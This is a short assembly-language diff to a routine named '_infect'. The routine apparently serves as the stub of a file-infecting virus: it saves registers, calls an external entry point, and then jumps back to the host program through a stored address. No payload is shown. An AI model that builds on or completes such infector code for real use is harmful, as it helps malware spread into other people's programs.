@@ -5,11 +5,6 @@ global memaddr
 extern entry
 
 _infect:
-jmp begin
-memaddr: db `00000000`
-size: db `00000000`
-
-begin:
 	push rax
 	push rbx
 	push rcx
@@ -27,7 +22,13 @@ begin:
 	push r14
 	push r15
 	pushf
-	
+
+jmp begin
+diff: db `00000000`
+memaddr: db `00000000`
+size: db `00000000`
+
+begin:
 	call entry
 
 	popf
@@ -48,5 +49,4 @@ begin:
 	pop rbx
 	pop rax
  
-	push 0x11111111
-	ret
+	jmp QWORD[diff]
